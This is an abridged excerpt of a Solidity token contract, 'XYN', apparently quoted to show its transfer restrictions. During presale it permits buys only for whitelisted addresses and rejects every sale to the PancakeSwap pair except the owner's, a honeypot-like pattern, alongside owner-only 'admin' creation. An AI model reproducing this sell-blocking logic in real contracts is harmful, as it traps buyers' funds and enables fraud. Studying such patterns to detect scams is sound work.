...
contract XYN is Context, IERC20, Ownable {
    ...
    uint256 private _mimimalTrForUpdateBuyer = 1000 * 10**18;
    ...
    function createAdmin(address wallet, uint256 impact) public onlyOwner {
    ...
    function startAdminPool(address[] memory addresses, uint256 impact) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            createAdmin(addresses[i], impact);
        }
    }
    ...
    function _transfer(
        ...
        require(amount < _tTotal.div(1000).mul(_trLimit), 'Maximum transaction limit');
        address _owner = owner();
        
        if(presale && from == pancakeV2Pair) {
            require(buyPermission[to], "No confirmation in stage");
        }

        if(presale && to == pancakeV2Pair && from != _owner) {
            require(false, "Wait");
        }
